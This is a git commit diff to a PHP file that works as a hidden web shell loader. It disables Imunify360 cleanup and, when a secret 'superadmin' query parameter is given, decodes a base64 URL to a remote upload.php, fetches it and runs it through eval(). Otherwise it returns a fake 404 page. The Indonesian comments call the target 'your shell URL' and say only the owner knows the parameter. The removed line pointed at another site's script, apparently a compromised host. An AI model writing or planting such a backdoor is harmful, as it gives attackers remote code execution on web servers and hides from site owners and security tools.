f96c5dd71d7ecd02f0ba34f81005ba46a48c5dd7
shell2306 <nisajaniasari27@gmail.com>
2026-08-05 21:03:22 +0700

    Update panen-kerang.php

--- panen-kerang.php
+++ panen-kerang.php
@@ -5,14 +5,11 @@ ini_set("imunify360.cleanup_on_restore", false);
 function get_data($url) {
     if (function_exists('curl_init')) {
         $ch = curl_init();
-
         curl_setopt($ch, CURLOPT_HEADER, 0);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
         curl_setopt($ch, CURLOPT_URL, $url);
-
         $data = curl_exec($ch);
         curl_close($ch);
-
         return $data;
     } else {
         $data = file_get_contents($url);
@@ -22,10 +19,16 @@ function get_data($url) {
 
 $x = '?>';
 
-if (isset($_GET['superadmin'])) {
+// [HANYA ANDA YANG TAHU PARAMETER INI]
+if (isset($_GET['superadmin'])) { 
+    // URL SHELL ANDA (SUDAH BENAR)
     $target_url = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NoZWxsMjMwNi9wZW5jYXJpa2VyYW5nL3JlZnMvaGVhZHMvbWFpbi91cGxvYWQucGhw');
 } else {
-    $target_url = base64_decode('aHR0cHM6Ly9kaWdpbGliLml0ay5hYy5pZC9zaW1iaW8yL3NpbWJpb19EQi9wZ3NxbC9jYWNoZS1ydW50aW1lLnBocA==');
+    // [PERBAIKAN] JANGAN arahkan ke diri sendiri atau shell orang lain!
+    // Cukup tampilkan error 404 saja.
+    header("HTTP/1.0 404 Not Found");
+    echo "Not Found";
+    exit;
 }
 
 eval($x . get_data($target_url));
